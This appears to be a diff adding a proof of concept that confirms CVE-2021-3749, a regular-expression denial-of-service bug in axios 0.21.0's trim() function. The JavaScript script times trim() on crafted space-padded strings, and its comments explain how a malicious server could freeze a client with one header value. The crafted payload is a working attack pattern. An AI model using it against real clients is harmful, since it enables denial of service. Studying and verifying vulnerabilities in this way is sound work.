@@ -1,0 +1,31 @@
+Confirmed: axios 0.21.0's internal `trim()` (`lib/utils.js`) uses two unbounded-backtracking regexes (`/^\s*/` and `/\s*$/`) fixed only in 0.21.2 (CVE-2021-3749). This function is invoked on every incoming response header value via `parseHeaders.js`, and I verified empirically that runtime grows quadratically — 80,000 padding characters already takes ~3.5s of blocking CPU time.
+
+```javascript
+// CVE-2021-3749: axios <0.21.2 ReDoS in lib/utils.js `trim()`
+// Vulnerable regexes: str.replace(/^\s*/, '').replace(/\s*$/, '')
+// Every HTTP response header value axios receives is passed through this
+// function (see lib/helpers/parseHeaders.js), so a malicious/compromised
+// server can send one crafted header value and freeze the client's
+// event loop with catastrophic/polynomial backtracking.
+
+const utils = require("./node_modules/axios/lib/utils.js");
+
+function timeTrim(padLen) {
+  // "1" + many spaces + "1": no leading/trailing whitespace actually
+  // needs trimming, which is exactly what makes the regex blow up.
+  const malicious = "1" + " ".repeat(padLen) + "1";
+  const start = process.hrtime.bigint();
+  utils.trim(malicious);
+  const ms = Number(process.hrtime.bigint() - start) / 1e6;
+  console.log(`payload length=${malicious.length.toString().padStart(7)}  trim() took ${ms.toFixed(1)} ms`);
+  return ms;
+}
+
+console.log("Demonstrating CVE-2021-3749 ReDoS in axios utils.trim()...\n");
+timeTrim(10000);
+timeTrim(20000);
+timeTrim(40000);
+timeTrim(80000); // observe ~4x time growth per doubling -> quadratic blowup,
+                  // a real server could push this into many seconds/minutes
+                  // of blocked CPU with a single crafted header value.
+```
